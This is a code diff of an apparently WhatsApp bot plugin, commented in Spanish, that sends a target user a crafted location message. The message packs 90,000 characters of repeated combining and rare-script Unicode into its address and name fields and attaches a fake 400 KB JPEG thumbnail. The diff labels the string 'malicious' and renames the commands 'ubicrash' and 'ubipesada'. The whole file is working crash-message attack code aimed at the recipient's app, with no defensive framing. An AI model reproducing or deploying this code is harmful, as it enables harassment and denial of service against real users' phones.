@@ -1,25 +1,19 @@
-import fetch from 'node-fetch'
-
 let handler = async (m, { conn }) => {
-  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat
+  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
   if (jid === conn.user.id) {
-    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m })
+    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
   }
 
-  const objetivo = jid
+  const objetivo = jid;
 
-  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵'
-  const repeticiones = 266
-  const caracteresPorRepeticion = caracter.length
-  const totalBase = repeticiones * caracteresPorRepeticion
-  const faltan = 90000 - totalBase
+  // Carácter malicioso
+  const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
+  const textoLargo = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);
 
-  const textoLargo = caracter.repeat(repeticiones) + caracter.slice(0, faltan)
-
-  // 🖼️ URL de Catbox con tu imagen .jpg (peso recomendado: 300–400 KB)
-  const catboxUrl = 'https://files.catbox.moe/ufwba7.jpeg' // reemplaza por la tuya
-  const res = await fetch(catboxUrl)
-  const thumbnail = await res.buffer()
+  // 🧪 Crea una imagen JPEG falsa de 400 KB
+  const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]); // JPEG header
+  const fill = Buffer.alloc(400 * 1024 - header.length, 0xFF); // Relleno con 0xFF
+  const fakeImage = Buffer.concat([header, fill]);
 
   const fakeLoc = {
     key: {
@@ -29,20 +23,20 @@ let handler = async (m, { conn }) => {
     },
     message: {
       locationMessage: {
-        name: 'Tobi',
-        degreesLatitude: 99.9999999999999999,
-        degreesLongitude: -99.99999999999999,
+        name: 'C•137DOMINA+ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵',
+        degreesLatitude: 19.432608,
+        degreesLongitude: -99.133209,
         address: textoLargo,
-        jpegThumbnail: thumbnail,
+        jpegThumbnail: fakeImage,
         isLive: false
       }
     }
-  }
+  };
 
-  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() })
-}
+  await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
+};
 
-handler.command = /^pito|ubithumburl$/i
-handler.owner = true
+handler.command = /^ubicrash|ubipesada$/i;
+handler.owner = true;
 
-export default handler
+export default handler;
